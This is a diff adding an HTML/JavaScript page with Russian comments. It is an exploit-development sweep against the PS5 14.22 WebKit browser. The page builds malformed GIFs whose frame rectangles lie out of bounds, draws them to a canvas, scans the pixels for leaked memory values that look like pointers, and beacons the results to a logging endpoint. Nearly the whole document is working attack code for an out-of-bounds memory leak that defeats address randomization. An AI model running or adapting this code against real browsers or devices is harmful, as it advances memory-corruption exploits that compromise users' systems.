@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<!--
+  l2b-gif-sweep.html — генеративный свип GIF frame-rect OOB (PS5 14.22, WebKit 605.1.15/7617).
+
+  Матрица (>=60 вариантов):
+    screen  ∈ {1x1, 2x2, 4x4, 8x8, 64x64}                (5)
+    xOffset ∈ {0xFFFE, 0xFFFF, 0x7FFF, 65000}            (4)
+    yOffset ∈ {0, 0xFFFE, 0xFFFF}                        (3)
+    кадров  ∈ {2, 3, 5}                                  (3)
+    стиль   ∈ {local palette, interlace, transparent, disposal 0/1/2} (циклически)
+  Итого 5*4*3*3 = 180 вариантов; ?max=N ограничивает (например ?max=60 для быстрого прогона).
+
+  Каждый вариант — отдельный Image; декод обёрнут в try/catch, таймаут на вариант, прогресс
+  каждые 10. Если декодер убивает WebProcess — в beacon остаётся последний L2-SWEEP-*.
+  Финальная строка (критерий на консоли, читать одну строку):
+      L2-SWEEP-DONE ptrcands=N best=<адрес> variant=<id>
+  плюс L2-SWEEP-SUMMARY (top-5 по foreign, список ptrcands>0).
+
+  Механизм/обоснование — recon/leak-hunt-1422.md, раздел «GIF frame-rect OOB».
+-->
+<meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>L2b GIF OOB sweep</title>
+<body style="background:#000;color:#0f0;font:12px monospace">
+<pre id="out">L2b GIF-OOB sweep boot…</pre>
+<script>
+'use strict';
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function bk(tag, data) {
+  var line = 'L2-SWEEP-' + tag + (data === undefined ? '' : ' ' + data);
+  say(line);
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/' + encodeURIComponent(line.slice(0, 700)) + '?t=' + Date.now(), true); x.send(); } catch (e) {}
+}
+
+/* ============================== LZW / GIF builders ============================== */
+function lzwEncodeFull(pixels, minCodeSize) {
+  var clearCode = 1 << minCodeSize, eoiCode = clearCode + 1;
+  var codeSize = minCodeSize + 1, next = eoiCode + 1, dict = {};
+  var out = [], bitBuf = 0, bitCnt = 0;
+  function emit(code) {
+    bitBuf |= (code << bitCnt); bitCnt += codeSize;
+    while (bitCnt >= 8) { out.push(bitBuf & 255); bitBuf >>>= 8; bitCnt -= 8; }
+  }
+  function keyOf(arr) { return arr.join(','); }
+  emit(clearCode);
+  var w = null;
+  for (var i = 0; i < pixels.length; i++) {
+    var k = pixels[i] & 255;
+    if (w === null) { w = [k]; continue; }
+    var cand = w.concat([k]), ck = keyOf(cand);
+    if (dict[ck] !== undefined) { w = cand; continue; }
+    emit(w.length === 1 ? w[0] : dict[keyOf(w)]);
+    dict[ck] = next++;
+    if (next > (1 << codeSize) && codeSize < 12) codeSize++;
+    if (next > 4095) { emit(clearCode); dict = {}; next = eoiCode + 1; codeSize = minCodeSize + 1; }
+    w = [k];
+  }
+  if (w !== null) emit(w.length === 1 ? w[0] : dict[keyOf(w)]);
+  emit(eoiCode);
+  if (bitCnt > 0) out.push(bitBuf & 255);
+  return out;
+}
+function blocks(data) {
+  var out = [], i = 0;
+  while (i < data.length) { var n = Math.min(i + 255, data.length) - i; out.push(n); for (var j = 0; j < n; j++) out.push(data[i + j] & 255); i += n; }
+  out.push(0); return out;
+}
+function pushLE16(a, v) { a.push(v & 255, (v >>> 8) & 255); }
+var PALETTE = [0x11, 0x22, 0x33, 0x44, 0x55, 0x66];
+function gce(disposal, transparent) {
+  var packed = ((disposal & 7) << 2) | (transparent !== undefined ? 1 : 0);
+  return [0x21, 0xF9, 0x04, packed, 0x10, 0x00, 0x00, transparent !== undefined ? (transparent & 255) : 0x00];
+}
+function imageDescriptor(f) {
+  var out = [0x2C];
+  pushLE16(out, f.left | 0); pushLE16(out, f.top | 0); pushLE16(out, f.w | 0); pushLE16(out, f.h | 0);
+  var packed = 0;
+  if (f.localPalette) packed |= 0x80;
+  if (f.interlaced) packed |= 0x40;
+  out.push(packed);
+  if (f.localPalette) for (var i = 0; i < PALETTE.length; i++) out.push(PALETTE[i]);
+  return out;
+}
+function pixelsFor(w, h) { var p = [], n = Math.max(1, (w | 0) * (h | 0)); for (var i = 0; i < n; i++) p.push(0); return p; }
+/* frames: массив {left,top,w,h,disposal,transparent,localPalette,interlaced} */
+function buildGifMulti(screenW, screenH, frames) {
+  var out = [];
+  out.push(0x47, 0x49, 0x46, 0x38, 0x39, 0x61);
+  pushLE16(out, screenW); pushLE16(out, screenH);
+  out.push(0xF0, 0x00, 0x00);
+  for (var i = 0; i < PALETTE.length; i++) out.push(PALETTE[i]);
+  out.push(0x21, 0xFF, 0x0B); for (i = 0; i < 11; i++) out.push('NETSCAPE2.0'.charCodeAt(i)); out.push(0x03, 0x01, 0x00, 0x00, 0x00);
+  frames.forEach(function (f) {
+    out = out.concat(gce(f.disposal === undefined ? 0 : f.disposal, f.transparent));
+    out = out.concat(imageDescriptor(f));
+    out.push(0x02);
+    out = out.concat(blocks(lzwEncodeFull(pixelsFor(f.w, f.h), 2)));
+  });
+  out.push(0x3B);
+  return out;
+}
+function dataURL(bytes) { var bin = ''; for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i] & 255); return 'data:image/gif;base64,' + btoa(bin); }
+
+/* ============================== scan ============================== */
+var MARKER = [0x11, 0x22, 0x33, 0xFF];
+function isPtrCandidate(v) {
+  var hi32 = Number((v >> 32n) & 0xffffffffn), lo32 = Number(v & 0xffffffffn);
+  var hi16 = Number((v >> 48n) & 0xffffn);
+  if (hi32 === 0 && lo32 >= 0x1000 && lo32 < 0x80000000) return 'userland32';
+  if (hi16 === 0xffff && v !== 0xffffffffffffffffn) return 'kernel/JSC-tag';
+  if (hi16 === 0xfffe) return 'JSC-cell-tag';
+  if (hi16 === 0x0000 && lo32 !== 0 && (lo32 & 7) === 0) return 'canonical-userland';
+  return false;
+}
+function scanPixels(data, w, h) {
+  var b = data.data, u = new Uint8Array(b.buffer, b.byteOffset, b.byteLength);
+  var foreign = 0, cands = [], i;
+  for (i = 0; i + 4 <= u.length; i += 4) {
+    if (u[i] !== MARKER[0] || u[i + 1] !== MARKER[1] || u[i + 2] !== MARKER[2] || u[i + 3] !== MARKER[3]) foreign += 4;
+  }
+  for (i = 0; i + 8 <= u.length; i += 8) {
+    var v = 0n;
+    for (var k = 7; k >= 0; k--) v = (v << 8n) | BigInt(u[i + k]);
+    var kind = isPtrCandidate(v);
+    if (kind) { var hx = v.toString(16); while (hx.length < 16) hx = '0' + hx; cands.push({ off: i, kind: kind, hex: '0x' + hx }); if (cands.length >= 16) break; }
+  }
+  return { total: u.length, foreign: foreign, cands: cands };
+}
+function readVariant(img) {
+  var cv = document.createElement('canvas');
+  var nw = Math.max(img.naturalWidth || 1, 1), nh = Math.max(img.naturalHeight || 1, 1);
+  cv.width = Math.min(Math.max(nw, 256), 512);
+  cv.height = Math.min(Math.max(nh, 256), 512);
+  var cx = cv.getContext('2d');
+  cx.fillStyle = '#000'; cx.fillRect(0, 0, cv.width, cv.height);
+  cx.drawImage(img, 0, 0, cv.width, cv.height);
+  var scan = scanPixels(cx.getImageData(0, 0, cv.width, cv.height), cv.width, cv.height);
+  return { nat: nw + 'x' + nh, foreign: scan.foreign, ptr: scan.cands.length, cands: scan.cands };
+}
+
+/* ============================== matrix ============================== */
+var SCREENS = [1, 2, 4, 8, 64];
+var XOFFS = [0xFFFE, 0xFFFF, 0x7FFF, 65000];
+var YOFFS = [0, 0xFFFE, 0xFFFF];
+var FRAMES = [2, 3, 5];
+var STYLES = ['local', 'interlace', 'transparent', 'disposal0', 'disposal1', 'disposal2'];
+function styleOf(name, f) {
+  if (name === 'local') f.localPalette = true;
+  if (name === 'interlace') f.interlaced = true;
+  if (name === 'transparent') f.transparent = 1;
+  if (name === 'disposal0') f.disposal = 0;
+  if (name === 'disposal1') f.disposal = 1;
+  if (name === 'disposal2') f.disposal = 2;
+}
+function makeVariants(max) {
+  var list = [], idx = 0;
+  for (var si = 0; si < SCREENS.length; si++) {
+    for (var xi = 0; xi < XOFFS.length; xi++) {
+      for (var yi = 0; yi < YOFFS.length; yi++) {
+        for (var fi = 0; fi < FRAMES.length; fi++) {
+          var style = STYLES[idx % STYLES.length];
+          var f = { left: XOFFS[xi], top: YOFFS[yi], w: SCREENS[si] + 1, h: SCREENS[si] + 1 };
+          styleOf(style, f);
+          var frames = [{ left: 0, top: 0, w: SCREENS[si], h: SCREENS[si] }];
+          frames.push(f);
+          for (var k = 2; k < FRAMES[fi]; k++) frames.push({ left: 0, top: 0, w: 1, h: 1, disposal: 0 });
+          var id = 'SW' + idx + '-s' + SCREENS[si] + '-x' + XOFFS[xi].toString(16) +
+            '-y' + YOFFS[yi].toString(16) + '-f' + FRAMES[fi] + '-' + style;
+          list.push({ idx: idx, id: id, screen: SCREENS[si], frames: frames });
+          idx++;
+          if (max && list.length >= max) return list;
+        }
+      }
+    }
+  }
+  return list;
+}
+var MAX = (function () { var m = /[?&]max=(\d+)/.exec(location.search); return m ? parseInt(m[1], 10) : 0; })();
+var VARIANTS = makeVariants(MAX);
+
+/* ============================== runner ============================== */
+var rows = [], started = Date.now(), doneCount = 0;
+function progress() {
+  var dec = rows.filter(function (r) { return r.state === 'decoded'; }).length;
+  var fail = rows.filter(function (r) { return r.state !== 'decoded'; }).length;
+  var ptr = rows.reduce(function (a, r) { return a + (r.ptr || 0); }, 0);
+  bk('PROGRESS', doneCount + '/' + VARIANTS.length + ' decoded=' + dec + ' fail=' + fail +
+    ' ptrcands=' + ptr + ' ms=' + (Date.now() - started));
+}
+function finish() {
+  var top = rows.slice().sort(function (a, b) { return (b.foreign - a.foreign) || (b.ptr - a.ptr); }).slice(0, 5);
+  var ptrRows = rows.filter(function (r) { return r.ptr > 0; });
+  var totalPtr = ptrRows.reduce(function (a, r) { return a + r.ptr; }, 0);
+  var bestRow = ptrRows.slice().sort(function (a, b) { return b.ptr - a.ptr; })[0] ||
+    rows.slice().sort(function (a, b) { return b.foreign - a.foreign; })[0];
+  var decoded = rows.filter(function (r) { return r.state === 'decoded'; }).length;
+  bk('TOP-FOREIGN', top.map(function (r) {
+    return r.id + ':' + r.foreign + 'B/ptr' + r.ptr;
+  }).join(' ; '));
+  bk('PTR-LIST', ptrRows.length ? ptrRows.map(function (r) { return r.id + '=' + r.ptr + '@' + r.best; }).join(' ; ') : '(none)');
+  bk('SUMMARY', 'variants=' + VARIANTS.length + ' decoded=' + decoded +
+    ' failed=' + (rows.length - decoded) + ' ptrcands=' + totalPtr +
+    ' top5=' + top.map(function (r) { return r.id + ':' + r.foreign; }).join(','));
+  // критерий на консоли — ровно эта строка:
+  bk('DONE', 'ptrcands=' + totalPtr + ' best=' + (bestRow && bestRow.best !== '-' ? bestRow.best : '-') +
+    ' variant=' + (bestRow ? bestRow.id : '-'));
+}
+function runNext(pos) {
+  if (pos >= VARIANTS.length) { finish(); return; }
+  var V = VARIANTS[pos];
+  var bytes;
+  try { bytes = buildGifMulti(V.screen, V.screen, V.frames); }
+  catch (e) { bk('BUILD-FAIL', V.id + ' ' + e); rows.push({ id: V.id, state: 'build-fail', foreign: 0, ptr: 0, best: '-' }); doneCount++; runNext(pos + 1); return; }
+  var img = new Image();
+  var settled = false;
+  var timer = setTimeout(function () {
+    if (settled) return; settled = true;
+    bk('TIMEOUT', V.id); rows.push({ id: V.id, state: 'timeout', foreign: 0, ptr: 0, best: '-' });
+    doneCount++; if (doneCount % 10 === 0) progress(); runNext(pos + 1);
+  }, 900);
+  function settle(state, res) {
+    if (settled) return; settled = true; clearTimeout(timer);
+    rows.push({ id: V.id, state: state, nat: res ? res.nat : '?',
+      foreign: res ? res.foreign : 0, ptr: res ? res.ptr : 0,
+      best: res && res.cands.length ? res.cands[0].hex : '-' });
+    doneCount++;
+    if (res && (res.ptr > 0 || res.foreign > 0)) {
+      bk('ROW', V.id + ' | nat=' + res.nat + ' | foreign=' + res.foreign + 'B | ptrcands=' + res.ptr +
+        ' | state=' + state + ' | best=' + (res.cands.length ? res.cands[0].hex : '-'));
+    }
+    if (doneCount % 10 === 0) progress();
+    runNext(pos + 1);
+  }
+  img.onerror = function () { settle('decode-fail', null); };
+  img.onload = function () {
+    try { var res = readVariant(img); settle('decoded', res); }
+    catch (e) { bk('READ-ERR', V.id + ' ' + e); settle('read-err', null); }
+  };
+  img.src = dataURL(bytes);
+}
+bk('BOOT', 'l2b-gif-sweep variants=' + VARIANTS.length + ' (max=' + (MAX || 'all') + ')' +
+  '; criterion: L2-SWEEP-DONE ptrcands=N best=<addr> variant=<id>');
+runNext(0);
+</script>
